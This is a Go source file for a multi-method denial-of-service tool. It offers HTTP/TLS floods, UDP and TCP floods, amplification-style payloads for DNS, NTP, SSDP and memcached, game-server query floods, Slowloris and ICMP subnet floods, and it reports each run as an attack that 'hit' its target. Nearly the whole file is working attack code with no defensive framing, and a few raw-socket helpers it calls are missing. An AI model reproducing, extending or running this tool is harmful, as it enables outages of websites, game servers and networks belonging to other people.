package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	totalSent    int64
	totalSuccess int64
	totalFail    int64
	runUntil     time.Time
	threads      int
	targetSubnet bool
	isL7         bool
)

var l7Methods = map[string]bool{
	"http": true, "https": true, "http2": true, "httpx": true,
	"browser": true, "rapidflood": true, "tls": true, "tlsx": true,
	"bypass": true, "cache": true, "cloudflare": true,
}

func randBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("usage: ./flood <method> <host> [port] <time> [threads]")
		os.Exit(1)
	}

	method := strings.ToLower(os.Args[1])
	target := os.Args[2]

	if method == "help" || method == "list" {
		fmt.Println("L7: http https http2 httpx browser rapidflood tls tlsx bypass cache cloudflare")
		fmt.Println("L4: dns udp ldap ssdp ntp memcached home udpbypass tcp socket slowloris ovh tcpmix tcpbypass ack")
		fmt.Println("L4 game: game rainbow rocket roblox fivem pubg fortnite warthunder counter samp minecraft")
		fmt.Println("L3: subnet icmp")
		return
	}

	isL7 = l7Methods[method]

	var (
		port     string
		duration int
		err      error
	)

	if isL7 {
		if len(os.Args) < 4 {
			fmt.Printf("usage: ./flood %s <url> <time> [threads]\r\n", method)
			os.Exit(1)
		}
		duration, err = strconv.Atoi(os.Args[3])
		if err != nil || duration <= 0 {
			fmt.Printf("invalid time: %s\r\n", os.Args[3])
			os.Exit(1)
		}
		threads = 128
		if len(os.Args) >= 5 {
			if t, ok := strconv.Atoi(os.Args[4]); ok == nil && t > 0 {
				threads = t
			}
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			if method == "http" {
				target = "http://" + target
			} else {
				target = "https://" + target
			}
		}
	} else {
		if len(os.Args) < 5 {
			fmt.Printf("usage: ./flood %s <host> <port> <time> [threads]\r\n", method)
			os.Exit(1)
		}
		port = os.Args[3]
		duration, err = strconv.Atoi(os.Args[4])
		if err != nil || duration <= 0 {
			fmt.Printf("invalid time: %s\r\n", os.Args[4])
			os.Exit(1)
		}
		threads = 100
		if len(os.Args) >= 6 {
			if t, ok := strconv.Atoi(os.Args[5]); ok == nil && t > 0 {
				threads = t
			}
		}
	}

	runUntil = time.Now().Add(time.Duration(duration) * time.Second)

	fmt.Printf("[*] Dispatching %s attack against %s for %ds (%d threads)\r\n", method, target, duration, threads)

	start := time.Now()

	switch {
	case isL7:
		runL7(target)
	case method == "subnet":
		targetSubnet = true
		runICMP(target)
	case method == "icmp":
		runICMP(target)
	case method == "slowloris":
		runSlowloris(target, port)
	default:
		runL4(method, target, port)
	}

	elapsed := time.Since(start).Seconds()
	fired := atomic.LoadInt64(&totalSent)
	clean := atomic.LoadInt64(&totalSuccess)
	bounced := atomic.LoadInt64(&totalFail)
	rate := 0.0
	if elapsed > 0 {
		rate = float64(fired) / elapsed
	}

	fmt.Printf("[+] Attack completed.\r\n")
	fmt.Printf("    Hit target: %s\r\n", target)
	fmt.Printf("    Time taken: %.4fs\r\n", elapsed)
	fmt.Printf("    Sent %d requests/packets.\r\n", fired)
	fmt.Printf("    Landed clean: %d\r\n", clean)
	fmt.Printf("    Bounced back: %d\r\n", bounced)
	fmt.Printf("    Cruising at: %.4f req/s\r\n", rate)
}

// ---------------------------------------------------------------------------
// L7 — fasthttp keep-alive flood (all L7 methods share this engine)
// ---------------------------------------------------------------------------

func runL7(url string) {
	client := &fasthttp.Client{
		Name:                          "curl/8.7.1",
		MaxConnsPerHost:               15000,
		MaxIdleConnDuration:           10 * time.Second,
		ReadTimeout:                   5 * time.Second,
		WriteTimeout:                  5 * time.Second,
		MaxResponseBodySize:           1 << 20,
		DisableHeaderNamesNormalizing: true,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS13,
			MaxVersion:         tls.VersionTLS13,
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		},
	}

	req := &fasthttp.Request{}
	req.Header.SetMethod(fasthttp.MethodGet)
	req.Header.Set("User-Agent", "curl/8.7.1")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	if host, ok := urlHost(url); ok {
		req.Header.SetHost(host)
	}
	req.SetRequestURIBytes([]byte(url))

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			resp := &fasthttp.Response{}
			for time.Now().Before(runUntil) {
				atomic.AddInt64(&totalSent, 1)
				err := client.Do(req, resp)
				resp.Reset()
				if err != nil {
					atomic.AddInt64(&totalFail, 1)
					continue
				}
				code := resp.StatusCode()
				if code >= 200 && code <= 499 {
					atomic.AddInt64(&totalSuccess, 1)
				} else {
					atomic.AddInt64(&totalFail, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func urlHost(url string) (string, bool) {
	rest := url
	if idx := strings.Index(url, "://"); idx >= 0 {
		rest = url[idx+3:]
	}
	if idx := strings.IndexAny(rest, "/?#"); idx >= 0 {
		rest = rest[:idx]
	}
	return rest, rest != ""
}

// ---------------------------------------------------------------------------
// L4 — UDP / TCP flooders
// ---------------------------------------------------------------------------

func randUint16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}

func randUint32() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint32(b[:])
}

func gamePayload(method string) []byte {
	randomSet := map[string]bool{
		"udpbypass": true, "home": true, "ldap": true, "game": true,
		"rainbow": true, "rocket": true, "pubg": true, "fortnite": true,
		"warthunder": true, "roblox": true,
	}
	switch {
	case method == "dns":
		hdr := make([]byte, 4)
		binary.BigEndian.PutUint16(hdr[0:2], randUint16())
		binary.BigEndian.PutUint16(hdr[2:4], 0x0100)
		p := make([]byte, 0, 64)
		p = append(p, hdr...)
		p = append(p, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01)
		p = append(p, 0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00)
		p = append(p, 0x00, 0x01, 0x00, 0x01)
		return p
	case method == "ntp":
		p := make([]byte, 48)
		p[0] = 0x1b
		return p
	case method == "ssdp":
		return []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
	case method == "memcached":
		return []byte("\x00\x01\x00\x00\x00\x01\x00\x00\r\n\r\nstats\r\n")
	case method == "fivem":
		return []byte("getinfo 1")
	case method == "samp":
		p := []byte("SAMP")
		p = append(p, 0xFF, 0xFF, 0xFF, 0xFF, 'g', 'e', 't', 'p', 'i', 'i', 0x00)
		return p
	case method == "counter":
		return []byte("\xff\xff\xff\xffTSource Engine Query\x00")
	case method == "minecraft":
		return []byte{0xFE, 0x01}
	case randomSet[method]:
		return randBytes(512)
	default:
		b := make([]byte, 32)
		binary.LittleEndian.PutUint32(b, randUint32())
		rand.Read(b[4:])
		return b
	}
}

func runL4(method, target, port string) {
	addr := net.JoinHostPort(target, port)

	isUDPLike := map[string]bool{
		"udp": true, "dns": true, "ldap": true, "ssdp": true, "ntp": true,
		"memcached": true, "home": true, "udpbypass": true, "game": true,
		"rainbow": true, "rocket": true, "roblox": true, "fivem": true,
		"pubg": true, "fortnite": true, "warthunder": true, "counter": true,
		"samp": true, "minecraft": true,
	}[method]

	payload := gamePayload(method)

	udpWork := func() {
		conn, err := net.Dial("udp", addr)
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(runUntil) {
			p := payload
			if p == nil {
				p = randBytes(1024)
			}
			if method == "udp" || method == "udpbypass" || method == "home" || method == "ldap" {
				p = randBytes(1024)
			}
			if _, err := conn.Write(p); err != nil {
				return
			}
			atomic.AddInt64(&totalSent, 1)
			atomic.AddInt64(&totalSuccess, 1)
		}
	}

	tcpWork := func() {
		for time.Now().Before(runUntil) {
			c, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
			if err != nil {
				atomic.AddInt64(&totalFail, 1)
				continue
			}
			c.Write(randBytes(512))
			c.Close()
			atomic.AddInt64(&totalSent, 1)
			atomic.AddInt64(&totalSuccess, 1)
		}
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if isUDPLike {
				udpWork()
			} else {
				tcpWork()
			}
		}()
	}
	wg.Wait()
}

// ---------------------------------------------------------------------------
// Slowloris
// ---------------------------------------------------------------------------

func runSlowloris(target, port string) {
	addr := net.JoinHostPort(target, port)
	var mu sync.Mutex
	var conns []net.Conn

	open := func() {
		c, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			return
		}
		fmt.Fprintf(c, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n", target)
		atomic.AddInt64(&totalSent, 1)
		mu.Lock()
		conns = append(conns, c)
		mu.Unlock()
	}

	for time.Now().Before(runUntil) {
		mu.Lock()
		full := len(conns) >= threads*50
		mu.Unlock()
		if !full {
			open()
			continue
		}
		mu.Lock()
		for i, c := range conns {
			c.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
			if _, err := c.Write([]byte("X-a: 1\r\n")); err != nil {
				c.Close()
				conns[i] = nil
			}
		}
		mu.Unlock()
		time.Sleep(5 * time.Second)
	}
	mu.Lock()
	for _, c := range conns {
		if c != nil {
			c.Close()
		}
	}
	mu.Unlock()
}

// ---------------------------------------------------------------------------
// ICMP / subnet (raw socket, falls back to UDP if not privileged)
// ---------------------------------------------------------------------------

func checksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 == 1 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = sum&0xffff + sum>>16
	}
	return ^uint16(sum)
}

func icmpEcho(id uint16, seq uint16) []byte {
	pkt := make([]byte, 8+56)
	pkt[0] = 8
	pkt[1] = 0
	binary.BigEndian.PutUint16(pkt[4:6], id)
	binary.BigEndian.PutUint16(pkt[6:8], seq)
	rand.Read(pkt[8:])
	binary.BigEndian.PutUint16(pkt[2:4], checksum(pkt))
	return pkt
}

func runICMP(target string) {
	ip := net.ParseIP(target)
	if ip == nil {
		ips, err := net.LookupIP(target)
		if err != nil || len(ips) == 0 {
			fmt.Printf("    could not resolve %s\r\n", target)
			return
		}
		ip = ips[0]
	}
	ip4 := ip.To4()
	if ip4 == nil {
		fmt.Printf("    target is not IPv4\r\n")
		return
	}

	fd, err := openRawICMP()
	if err != nil {
		fmt.Printf("    raw socket unavailable (%v) — falling back to UDP flood\r\n", err)
		runL4("udp", target, "7")
		return
	}
	defer closeRawICMP(fd)

	var addr [4]byte
	copy(addr[:], ip4)
	for time.Now().Before(runUntil) {
		if targetSubnet && addr[3] > 0 {
			addr[3]--
		}
		skt := [4]byte{addr[0], addr[1], addr[2], addr[3]}
		if err := rawICMPSend(fd, skt, icmpEcho(randUint16(), randUint16())); err == nil {
			atomic.AddInt64(&totalSent, 1)
			atomic.AddInt64(&totalSuccess, 1)
		} else {
			atomic.AddInt64(&totalFail, 1)
		}
	}
}